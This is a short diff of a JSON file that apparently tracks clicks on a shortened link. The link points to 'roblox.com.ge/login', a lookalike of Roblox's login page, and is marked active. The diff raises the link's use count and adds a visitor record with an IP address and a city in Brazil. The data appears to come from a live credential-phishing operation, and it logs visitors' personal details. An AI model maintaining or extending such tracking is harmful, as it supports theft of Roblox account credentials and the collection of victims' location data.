@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1605,
+    "useCount": 1606,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13008,6 +13008,14 @@
         "city": "Memphis",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777513737686,
+        "ip": "45.6.164.126",
+        "country": "Brazil",
+        "city": "Salto",
+        "flag": "🇧🇷",
+        "countryCode": "BR"
       }
     ]
   },
